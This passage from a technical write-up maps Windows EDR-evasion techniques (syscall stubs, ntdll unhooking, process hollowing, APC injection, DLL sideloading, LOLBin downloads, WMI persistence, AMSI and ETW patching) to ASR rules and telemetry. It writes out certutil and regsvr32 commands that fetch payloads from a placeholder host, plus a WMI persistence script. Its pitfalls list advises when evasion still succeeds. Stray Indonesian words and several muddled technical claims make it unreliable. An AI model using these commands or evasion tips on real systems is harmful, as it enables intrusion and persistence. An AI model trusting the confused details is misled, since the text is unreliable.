## 3. Technique → Rule → Telemetry → Practical Limits

### 3.1 Direct Syscall / Hell's Gate / Halo's Gate (NtCreateThreadEx via syscall stub)

**Sent:** `mov r10, rcx; mov eax, <SSN>; syscall` from userland module, without going through `ntdll`.

**ASR Rule:** no specific ASR rule. **Not** an ASR domain.

**EDR Telemetry that captures:**
- **Kernel-mode callbacks** (`PsSetCreateProcessNotifyRoutineEx`) — cannot be avoided from userland. Every `NtCreateProcess` / `NtCreateThreadEx` is still recorded in kernel before/outside `ntdll`.
- **ETW-TI** (`Microsoft-Windows-Threat-Intelligence`) — emitted by kernel, not `ntdll`. `TelemetrySource=KernelThreatIntel` cannot be detoured from userland (CIG `PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY` + `EtwProviderEnableInfo`).
- **MDE `CreateRemoteThreadApiCall`** from `DeviceEvents` — triggered via kernel callback `PsSetCreateThreadNotifyRoutine`.

**Why it fails (practical limits):**
- Syscall stub avoids **userland hook**, but modern EDR (CrowdStrike Falcon 7.x, SentinelOne 23.x, Defender 4.18) moved to **kernel-mode + ETW-TI + callstack image validation**. `CallingProcess` with return address in `.text` without module (`MEM_PRIVATE` + `PAGE_EXECUTE_READWRITE`) → flag `UnknownImageBackedMemory`.
- Windows 11 24H2 + HVCI: `NtCreateThreadEx` with start routine in `MEM_PRIVATE` region **still** passes mechanically, but Defender `Behavior:Win32/Hive.ZY` flags pattern `VirtualAlloc` + `memcpy` from unsigned PE section.
- **Real limit:** if the EDR is *only* userland hook (e.g. old Defender without cloud `DeviceImageLoadEvents`), syscall bypass is effective. If MDE + ETW-TI is active, **this bypass is cosmetic**.

### 3.2 NTDLL Unhooking (fresh `ntdll.dll` from KnownDlls / `C:\Windows\System32\ntdll.dll` mapping)

**Sent:** copy `.text` section from `\KnownDlls\ntdll.dll` (section object) to `.text` current ntdll.

**Rule:** no ASR.

**Telemetri:**
- `DeviceImageLoadEvents` **not** triggered (KnownDlls already mapped).
- **Memory scan**: MDE `MpCmdRun.exe -Scan -ScanType 3 -File` on process memory; heuristic `Behavior:Win32/AmsiTamper` appears when `ntdll` bytes mismatch with disk (via `DeviceEvents` ActionType=`AntivirusScan`).
- **ETW-TI `CallStack`**: if `ReturnAddress` falls outside module list (synthetic stub) → `Unbacked` flag.
- **Kernel `PsSetLoadImageNotifyRoutine`**: not triggered for KnownDlls section map (already there).

**Why it fails:**
- 2024-fast EDR uses **`NtProtectVirtualMemory` wrapper in kernel callback** to detect `PAGE_EXECUTE_READ` `.text` that is `VirtualProtect`ed then restored → `SuspectMemoryWrite` in ntdll.
- **HVCI + VBS**: `MmProtectMdlSystemAddress` on `.text` of known dll → integrity check via `CiHvciQueryImage` for driver; userland uses **Control Flow Guard** — ntdll Cf-protection (`CET` in Windows 11 24H2, `CetCompat=1`) → `endbr64` mismatch if stub is replaced.
- **Limit:** unhook is only effective against EDR that periodically re-hooks (e.g. `ScyllaHide`-style). Modern EDR does not re-hook, they read **kernel events**, so unhook = zero impact.

### 3.3 Process Hollowing / Process Doppelgänging (suspended `svchost.exe` → unmapped → PE write)

**Dikirim:** `CreateProcess(CREATE_SUSPENDED)` → `NtUnmapViewOfSection` → `VirtualAllocEx` → `WriteProcessMemory` → `SetThreadContext` → `ResumeThread`.

**ASR Rule:** — (not specific). But product to product:
- MDE: `Behavior:Win32/ProcessHollower` (Behavior Monitoring).
- CrowdStrike: `Process Hollowing` ML.
- S1: `Injection via Hollowing` static + behavioral.

**Telemetri:**
- `DeviceEvents` ActionType=`OpenProcessApiCall` + `CreateRemoteThreadApiCall`; grant `0x1F0FFF`.
- `NtUnmapViewOfSection` **does not** appear in ETW-TI directly, but `NtWriteVirtualMemory` cross-proc → `DeviceEvents` `WriteProcessMemoryApiCall`.
- `SeDebugPrivilege` in caller → `4688` + token field from MDE.

**Why it fails:**
- `VirtualAllocEx(MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)` in target process **≠** image backing → kernel `PsSetCreateProcessNotifyRoutineEx` already flags `Image NOT backed by file` at `ResumeThread` (`SeAuditProcessCreation`).
- `PAGE_EXECUTE_READWRITE` write to remote → **CFG call target validation** in Windows 11 24H2 (`ProcessSignaturePolicy`). If target has CFG (`svchost` yeah), thread start in `MEM_PRIVATE` → `STATUS_INVALID_IMAGE_NOT_MZ`.
- **Limit:** if target = process that is **not yet** CFG (many third-party `.exe`), hollowing **still** works. But Defender 4.18 has `HollowingBehavior` heuristic that triggers on `NtUnmapViewOfSection` + `ResumeThread` with `Peb->ImageBaseAddress` mismatch.

### 3.4 APC Injection (`QueueUserAPC` to alertable thread)

**Sent:** `OpenProcess(PROCESS_ALL_ACCESS)` → `VirtualAllocEx` → `WriteProcessMemory` → `QueueUserAPC` to `explorer.exe` thread that is `WaitForSingleObjectEx(TRUE)`.

**Telemetri:**
- ETW-TI `APC` event (`Microsoft-Windows-Threat-Intelligence` `KERNEL_CALLBACK` for `NtQueueApcThreadEx`, **only** kernel consumer).
- MDE `DeviceEvents` `NtQueueApcThreadApiCall` (kalau enabled, MDE 101.24032.0002+).
- `Kernel-Process` `KernelThread` with start address in `MEM_PRIVATE`.

**Why it failed:**
- `QueueUserAPC` to **Protected Process Light** process (`lsass`, `MsMpEng`) → `STATUS_ACCESS_DENIED` (PPL). Windows 11 24H2 PPL for `MsMpEng`, `WinDefend`, `Sense`.
- `CFG` on `explorer.exe` → APC routine in `MEM_PRIVATE` unbaked → `STATUS_CONTROL_PROTECTION_VIOLATION` at dispatch.
- **Limit:** APC to `notepad.exe` thread (non-CFG legacy) still works; to browser process (Chrome 131 renderer with MTE/CFG) dies.

### 3.5 DLL Sideload / Search Order Hijack (unsigned proxy DLL in signed exe folder)

**Sent:** dup `version.dll` in `%LOCALAPPDATA%\Microsoft\Teams\` sideloaded by signed `Update.exe`.

**Rule ASR:** 
- `Block executable content from email` (kalau via email).
- `BE9BA2D9` — no.
- **`Block all Office applications from creating child processes`** — NO.
- Specific ASR: **none**, but `Attack Surface Reduction: Block untrusted/unsigned binaries from USB` (if via USB).

**Telemetri:**
- `DeviceImageLoadEvents` `FileName=version.dll`, `SignatureStatus=Unspecified`, `FolderPath=...\Teams`.
- MDE `Behavior:Win32/Sideloading` (2023+) → parent `Update.exe` + child unsigned DLL in user path.
- `DeviceProcessEvents` `InitiatingProcessImageLoad` (MDE 2024 feature) → chain signed→unsigned.

**Why it failed:**
- **WDAC/Smart App Control** in Win11 24H2 (default in Enterprise) → unsigned DLL in user path *blocked at load*, not detect after.
- **DLL search order protection** (`SetDefaultDllDirectories(LOAD_LIBRARY_SEARCH_SYSTEM32)`) in modern apps (Teams 24215+, Chrome 131).
- **Limit:** sideload only effective on binaries **signed but without SafeDllSearchMode / signed but default search order**. Many EDRs now detect via **`DeviceImageLoadEvents` cloud correlation** — unsigned payload load by signed parent = high signal.

### 3.6 LOLBin Chain (`certutil -urlcache`, `mshta`, `rundll32`, `regsvr32 /s /u /i:http`) 

**Dikirim:**
```
certutil.exe -urlcache -split -f https://x/y.b64 y.b64
certutil.exe -decode y.b64 y.exe
```
atau
```
regsvr32.exe /s /u /i:https://x/y.sct scrobj.dll
```

**Rule ASR:**
- `Block execution of potentially obfuscated scripts` → trigger `regsvr32 /i:http` (scriptlet).
- `Block JS/VBS from launching downloaded executables` → `mshta http`.
- `Block Office child processes` → `winword → certutil`.
- **GUID `D3E037E1`** triggers on `mshta` with remote URL.

**Telemetri:**
- `4688` + `ParentImage` + `CommandLine` (butuh audit process creation + cmdline).
- MDE `DeviceProcessEvents` `ProcessCommandLine` string match: `certutil -urlcache -split -f`, `regsvr32 /i:http`.
- AMSI for `.sct` via `scrobj.dll` → `Microsoft-Windows-PowerShell 4104` (if `-i:http`).

**Why it failed:**
- MDE 2024 has **`certutil` URL fetch detection** `Behavior:Win32/CertutilDownload` string match. No ML needed.
- `regsvr32 /i:http` **almost certainly** blocked by ASR `Block execution of potentially obfuscated scripts` (default Block in Defender).
- **Limit:** `rundll32` with local DLL (no download) **passes** — doesn't trigger any ASR. But `DeviceImageLoadEvents` records `rundll32 → unsigned.dll` → signal.

### 3.7 WMI Event Subscription Persistence

**Dikirim:**
```powershell
$f = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{Name='x'; EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}
$c = Set-WmiInstance -Class CommandLineEventConsumer ...
Set-WmiInstance -Class __FilterToConsumerBinding ...
```

**ASR rule:** `26190899-1602-49E8-8B27-EB1D0A1CE869` — `Block persistence through WMI event subscription` (default **Block** in new Windows 11 24H2; audit in 22H2).

**Telemetri:**
- `Microsoft-Windows-WMI-Activity/Operational` 5857/5860/5861 → `ClientProcessId`, `Query`.
- `DeviceEvents` `WmiSubscriptionCreated`.
- Sysmon 19/20/21 (`WmiEventFilter`, `WmiEventConsumer`, `WmiEventConsumerToFilter`).

**Why it failed:**
- ASR `26190899` in Defender 4.18 **default Block** in new SKUs → `Set-WmiInstance` returns `Access Denied`.
- **Limit:** if ASR is in Audit (not Block) — many environments — persistence works but EDR still flags. If attacker uses non-CommandLine `__EventConsumer` (e.g. `ActiveScriptEventConsumer` — blocked by ASR `Block execution of potentially obfuscated scripts` via AMSI).

## 4. Practical Limits Table — Userland Evasion per Event Source

| Event source | Bypassable from userland? | Why / limit |
|---|---|---|
| Userland API hook (`ntdll` inline) | **Yes** (unhook, syscall, fresh map) | Modern EDR doesn't rely here. |
| `PsSetCreateProcessNotifyRoutineEx` | **No** | Kernel callback, driver-signed. |
| `PsSetLoadImageNotifyRoutine` | **No** | Kernel callback. |
| `PsSetCreateThreadNotifyRoutine` | **No** | Kernel callback. |
| `ObRegisterCallbacks` (handle strip) | **No** | Kernel. |
| **ETW-TI (`Microsoft-Windows-Threat-Intelligence`)** | **No** (requires kernel driver patch / CIG bypass) | Kernel provider; userland detour requires `EtwProviderEnableInfo` patch via BYOVD. |
| AMSI (`amsi.dll` patch) | **Yes** temporarily | `amsi.dll` reloaded via `LoadLibrary` after patch → detect `Behavior:Win32/AmsiTamper`. Windows 11 24H2 AMSI provider integrity via `MpSvc` reload. |
| ETW classic (`Microsoft-Windows-Kernel-Process`) | **Yes** (patch `EtwEventWrite`) | but kernel callback still emits; EDR uses callback. |
| Script Block Logging (`4104`) | **Yes** (patch `EtwEventWrite` in `powershell.exe`) | but PowerShell 7.4+ has **AMSI + SBOM + `Microsoft.Windows.PowerShell`** redundant; downgrade to `v2` engine blocked by ASR `Block WinRM/PSv2` (`C1DB55AB` no, but `Block PowerShell v2` no default ASR — requires registry `DisablePowerShellV2`; Windows 11 24H2 PowerShell 2.0 **removed** from optional feature). |

**Concrete version numbers that change the limits:**
- Windows 11 **24H2** (build 26100): HVCI default on for Enterprise SKU; `Vulnerable Driver Blocklist` on by default.
- Defender Antivirus **4.18.24080+**: `Behavior:Win32/ProcessHollower` stabil; `DeviceImageLoadEvents` parent-child correlation.
- MDE **101.24032.0002**: `OpenProcessApiCall` + `CreateRemoteThreadApiCall` in GA.
- Chrome **131**: renderer CFG + `MEMORY_PARTITION_ALLOC` → APC to renderer dies.
- nginx **1.25**: (for C2 profile LOLBin) — `allow`/`deny` rule; EDR `DeviceNetworkEvents` captures `User-Agent` + JA3/JA4; nginx default `server_tokens on` → banner leak in `DeviceNetworkEvents` if TLS cert matches known C2.

## 5. Operational Pitfalls (that make techniques fail in the field)

1. **ASR `Block process creations from PSExec and WMI` (`E6DB77E5`) default Block in Win11 24H2 Enterprise** — `wmiprvse.exe → cmd.exe` chain dies; WMI persistence also hit by `26190899`. Check first `Get-MpPreference | fl AttackSurfaceReductionRules_Ids,AttackSurfaceReductionRules_Actions`.
2. **Intel/AMD driver blocklist via `CiTool.exe -r`** — `iqvw64e.sys` (v2.4.0.0) in blocklist; BYOVD to patch ETW-TI **fails to load**. Windows 11 24H2 `CodeIntegrity` 3033 in Event Log.
3. **HVCI + CFG + CET** — APC/hollowing to modern processes (`svchost`, Chrome, Edge) **crash** with `0xC0000409` (STATUS_STACK_BUFFER_OVERRUN) not success. In lab without HVCI works; field (Intune baseline) dies.
4. **`OpenProcess` to LSASS with `0x1010`** → ASR `9E6C4E1F` Block, **but** `0x1410` (plus `PROCESS_VM_READ`) → handled via `ObRegisterCallbacks` PPL; `0x1F0FFF` → CAPTURED. There is no safe grant access for LSASS in MDE.
5. **`VirtualAllocEx` `PAGE_EXECUTE_READWRITE` on remote** → `DeviceEvents` `WriteProcessMemoryApiCall` + `CreateRemoteThreadApiCall`; if the target = new `notepad.exe` (Win11 24H2, CFG+CET), thread start in `MEM_PRIVATE` is **rejected** by the kernel (`STATUS_INVALID_IMAGE_NOT_MZ`).
6. **AMSI patch via `AmsiScanBuffer` ret** → Defender 4.18 reloads `amsi.dll` per-scan (`amsi.dll` is loaded per `powershell` invocation with `MpSvc.dll` integrity) → `Behavior:Win32/AmsiTamper` at 1116. Patching `EtwEventWrite` to disable `4104` does **not** disable AMSI.
7. **`certutil -urlcache` is blocked by MDE string-match**, but `certutil -verifyctl` / `-URL` **bypasses** the string matcher — **trap:** the attacker moves, but the `DeviceNetworkEvents` + `DeviceProcessEvents` chain (certutil → child process) is still flagged via ML. `rundll32` with a local DLL **bypasses ASR** but `DeviceImageLoadEvents` (unsigned DLL) flags it.
8. **Sideload in the `%LOCALAPPDATA%` folder** → Smart App Control (Win11 24H2 default on fresh install) **blocks** unsigned DLLs. Sideload in `C:\Program Files\` requires admin + WDAC.
9. **`vssadmin delete shadows` / `bcdedit`** → ASR `Block rebooting into Safe Mode` + `Advanced ransomware protection`; T1003.003 (NTDS) → `lsass` PPL + ASR `9E6C4E1F`.
10. **ETW-TI** is only **active** if an EDR consumer is attached; on a host **without** EDR (e.g. a lab VM without MDE), syscall/hollowing **succeeds 100%** — don't draw conclusions from an empty lab. Test on a host with MDE 4.18 + HVCI on.
11. **`ntdll` unhook** via KnownDlls → `NtCreateFile` on `\KnownDlls\ntdll.dll` is already mapped; EDR does **not** see `DeviceImageLoadEvents`, but **MDE memory scan** (`MpCmdRun -Scan -ScanType 3`) detects `.text` mismatch with disk → `Behavior:Win32/AmsiTamper` / `SuspiciousMemory`. Don't rely on `DeviceImageLoadEvents` for unhook detection.
12. **Time-of-check**: Defender signature update daily (3x/day), MDE cloud lookup latency 15–60 seconds. A technique that "works" at 03:00 can die at 09:00 after the `Behavior:Win32/Hive.ZY` signature is pushed. Version pin: `MpCmdRun -SignatureUpdate` + `Get-MpComputerStatus | fl AMEngineVersion,AntivirusSignatureVersion`.
13. **Linux side (Defender for Endpoint on Linux 101.24032)**: `eBPF` `execve` captures `argv`; `ptrace` from a sibling process → `AuditD` `SYSCALL=ptrace`, Defender `Behavior:Linux/PtraceInjection`. Userland evasion (`LD_PRELOAD` unhook) does **not** avoid eBPF because the eBPF path is in the kernel (`/sys/fs/bpf`). Limit: a container with `CAP_SYS_ADMIN` can detach the eBPF program — requires `seccomp` bypass.
14. **Network LOLBin (`nginx 1.25` C2 profile)** — `DeviceNetworkEvents` `InitiatingProcessFileName=nginx.exe`, `RemoteIP`, `RemotePort`, `RemoteUrl`. EDR cloud correlation: `nginx.exe` is signed but **not in the Microsoft signed-process allowlist** for outbound non-80/443 → `SuspiciousNetworkConnection`. `server_tokens on` → banner `nginx/1.25` in `DeviceNetworkEvents` AdditionalFields → matches the C2 profile library.
15. **PowerShell 2.0 removed in Win11 24H2** — `powershell -v 2` → error; the engine downgrade technique is dead. `get-wmiobject` legacy cmdlet in PS 5.1 → `WmiActivity` visible; PS 7.4 → .NET `System.Management` → **no** WMI-Activity ETW? wrong: `System.Management` still goes through the WMI service → `WmiActivity` + `DeviceEvents`.
